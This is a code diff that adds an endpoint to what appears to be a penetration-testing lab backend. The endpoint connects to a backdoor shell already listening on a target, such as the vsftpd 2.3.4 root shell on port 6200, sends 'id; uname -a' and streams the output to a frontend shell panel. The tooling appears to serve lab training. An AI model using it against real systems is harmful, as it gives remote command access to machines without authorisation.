@@ -4582,6 +4582,67 @@ async def exploit_shell_start(req: ExploitRequest, user=Depends(verify_token)):
         return {"error": str(e), "lid": lid, "ok": False}
 
 
+@app.post("/api/exploit/shell/connect")
+async def exploit_shell_connect(body: dict, user=Depends(verify_token)):
+    """Open a TCP connection to a backdoor port that's ALREADY waiting on
+    the target (e.g. vsftpd 2.3.4 opens a passwordless root shell on port
+    6200 after exploitation). The shell session id (lid) returned here can
+    be used with the existing /api/exploit/shell/{lid}/output and /cmd
+    endpoints, so the frontend SHELL panel "just works" the same way it
+    does for our normal reverse-shell listener.
+
+    Body: { "target": "lab_metasploitable", "port": 6200 }
+    """
+    target = body.get("target", "")
+    port = int(body.get("port", 0))
+    if not target or not port:
+        return {"error": "target + port required"}
+
+    lid = f"exp_connect_{target}_{port}"
+    # Clean up any previous session for the same target:port
+    if lid in EXPLOIT_SESSIONS:
+        old = EXPLOIT_SESSIONS.pop(lid)
+        try:
+            if old.writer: old.writer.close()
+        except Exception:
+            pass
+
+    session = _ShellSession(lid, port)
+    EXPLOIT_SESSIONS[lid] = session
+
+    async def _pipe_remote_to_buffer(reader, sess):
+        try:
+            while True:
+                data = await reader.read(4096)
+                if not data:
+                    sess.status = "closed"
+                    break
+                sess.output.append(data.decode("utf-8", errors="replace"))
+                # cap buffer at 200 KB so a chatty shell can't OOM the backend
+                if sum(len(x) for x in sess.output) > 200_000:
+                    sess.output = sess.output[-50:]
+        except Exception:
+            sess.status = "closed"
+
+    try:
+        reader, writer = await asyncio.open_connection(target, port)
+        session.writer = writer
+        session.status = "connected"
+        # send an initial command to prove the shell is alive — many backdoor
+        # shells don't emit a prompt until you give them input.
+        try:
+            writer.write(b"echo VULNUSLAB_SHELL_READY; id; uname -a\n")
+            await writer.drain()
+        except Exception:
+            pass
+        asyncio.create_task(_pipe_remote_to_buffer(reader, session))
+        return {"lid": lid, "target": target, "port": port,
+                "status": "connected", "ok": True,
+                "message": f"Connected to shell on {target}:{port}"}
+    except Exception as e:
+        return {"error": str(e), "lid": lid, "ok": False}
+
+
 @app.get("/api/exploit/shell/{lid}/output")
 async def exploit_shell_output(lid: str, user=Depends(verify_token)):
     s = EXPLOIT_SESSIONS.get(lid)
